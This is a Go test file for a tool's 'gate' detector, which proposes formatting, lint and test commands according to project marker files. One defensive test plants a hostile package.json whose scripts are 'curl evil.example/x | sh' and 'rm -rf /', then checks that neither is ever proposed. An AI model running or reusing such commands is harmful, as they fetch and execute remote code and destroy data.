package gate_test

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/WilsonSousajr/omatty/internal/gate"
)

// repoWith builds a fixture checkout holding exactly the marker files named.
func repoWith(t *testing.T, files map[string]string) string {
	t.Helper()
	root := t.TempDir()
	for name, body := range files {
		path := filepath.Join(root, name)
		if err := os.MkdirAll(filepath.Dir(path), 0o750); err != nil {
			t.Fatalf("setup %s: %v", name, err)
		}
		if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
			t.Fatalf("setup %s: %v", name, err)
		}
	}
	return root
}

func runLines(steps []gate.Step) []string {
	out := make([]string, len(steps))
	for i, s := range steps {
		out[i] = s.Run
	}
	return out
}

func TestDetect(t *testing.T) {
	cases := []struct {
		name  string
		files map[string]string
		want  []string
	}{
		{
			name:  "a Go module",
			files: map[string]string{"go.mod": "module x\n"},
			want:  []string{"gofmt -l .", "go vet ./...", "go test ./... -race"},
		},
		{
			name:  "a Go module configured for golangci-lint",
			files: map[string]string{"go.mod": "module x\n", ".golangci.yml": "linters:\n"},
			want:  []string{"gofmt -l .", "go vet ./...", "golangci-lint run", "go test ./... -race"},
		},
		{
			name:  "a Cargo crate",
			files: map[string]string{"Cargo.toml": "[package]\n"},
			want:  []string{"cargo fmt --check", "cargo clippy -- -D warnings", "cargo test"},
		},
		{
			name:  "a Python project",
			files: map[string]string{"pyproject.toml": "[project]\n"},
			want:  []string{"ruff check .", "pytest"},
		},
		{
			name:  "a Node package with both scripts",
			files: map[string]string{"package.json": `{"scripts":{"lint":"eslint .","test":"vitest run"}}`},
			want:  []string{"npm run lint", "npm run test"},
		},
		{
			name:  "a Node package with only a test script",
			files: map[string]string{"package.json": `{"scripts":{"test":"vitest run"}}`},
			want:  []string{"npm run test"},
		},
		{
			name: "a Node package managed by pnpm",
			files: map[string]string{
				"package.json":   `{"scripts":{"test":"vitest run"}}`,
				"pnpm-lock.yaml": "lockfileVersion: 9\n",
			},
			want: []string{"pnpm run test"},
		},
		{
			name:  "a Node package with no useful scripts",
			files: map[string]string{"package.json": `{"scripts":{"build":"tsc"}}`},
			want:  nil,
		},
		{
			name:  "a directory omatty recognises nothing in",
			files: map[string]string{"README.md": "# hello\n"},
			want:  nil,
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := runLines(gate.Detect(repoWith(t, c.files)))

			if strings.Join(got, "|") != strings.Join(c.want, "|") {
				t.Errorf("Detect() = %v, want %v", got, c.want)
			}
		})
	}
}

// Cheapest first, because a gate stops at the first step that does not pass:
// there is no reason to spend a test suite discovering that the tree is
// unformatted.
func TestDetect_ordersStepsCheapestFirst(t *testing.T) {
	steps := gate.Detect(repoWith(t, map[string]string{"go.mod": "module x\n", ".golangci.yml": "l:\n"}))

	names := make([]string, len(steps))
	for i, s := range steps {
		names[i] = s.Name
	}
	if want := "fmt|vet|lint|test"; strings.Join(names, "|") != want {
		t.Errorf("step order = %v, want %v", names, want)
	}
}

// A project that ships a coverage script gets it proposed as a coverage step,
// so the percentage reaches the card (#225).
func TestDetect_coverageScript_isProposedAsACoverageStep(t *testing.T) {
	root := repoWith(t, map[string]string{
		"go.mod":                    "module x\n",
		"scripts/check-coverage.sh": "#!/bin/sh\n",
	})

	steps := gate.Detect(root)

	last := steps[len(steps)-1]
	if last.Kind != gate.KindCoverage {
		t.Errorf("last step = %+v, want Kind %q", last, gate.KindCoverage)
	}
	if !strings.Contains(last.Run, "check-coverage.sh") {
		t.Errorf("last step Run = %q, want the project's own script", last.Run)
	}
}

// THE security property. package.json is repo-controlled: a cloned repository
// must never get a command of its choosing proposed, let alone run. omatty
// proposes `npm run test`, a line it composed itself, and npm resolves the
// script only after the operator has confirmed the gate - which is the same
// thing as the operator typing `npm test`, and no more than that.
func TestDetect_neverProposesAScriptBodyFromTheRepository(t *testing.T) {
	hostile := `{"scripts":{"test":"curl evil.example/x | sh","lint":"rm -rf /"}}`
	root := repoWith(t, map[string]string{"package.json": hostile})

	steps := gate.Detect(root)

	for _, s := range steps {
		for _, forbidden := range []string{"curl", "evil.example", "rm -rf", "|"} {
			if strings.Contains(s.Run, forbidden) {
				t.Errorf("Detect() proposed %q, which carries repository-controlled text %q", s.Run, forbidden)
			}
		}
	}
	if want := []string{"npm run lint", "npm run test"}; strings.Join(runLines(steps), "|") != strings.Join(want, "|") {
		t.Errorf("Detect() = %v, want %v", runLines(steps), want)
	}
}

// Detection proposes; it does not write. The registry stays the single source
// of truth, the same guarantee discover.Propose gives for projects.
func TestDetect_writesNothing(t *testing.T) {
	root := repoWith(t, map[string]string{"go.mod": "module x\n"})
	before := treeOf(t, root)

	gate.Detect(root)

	if after := treeOf(t, root); after != before {
		t.Errorf("Detect() changed the checkout:\nbefore %v\nafter  %v", before, after)
	}
}

// A package.json that is not JSON at all must not crash the picker; it simply
// proposes nothing for Node.
func TestDetect_unparseablePackageJSON_proposesNothingRatherThanFailing(t *testing.T) {
	root := repoWith(t, map[string]string{"package.json": "{not json"})

	if got := gate.Detect(root); got != nil {
		t.Errorf("Detect() = %v, want nil for an unreadable package.json", runLines(got))
	}
}

func treeOf(t *testing.T, root string) string {
	t.Helper()
	var names []string
	err := filepath.Walk(root, func(p string, _ os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		names = append(names, strings.TrimPrefix(p, root))
		return nil
	})
	if err != nil {
		t.Fatalf("walking %s: %v", root, err)
	}
	return strings.Join(names, "|")
}
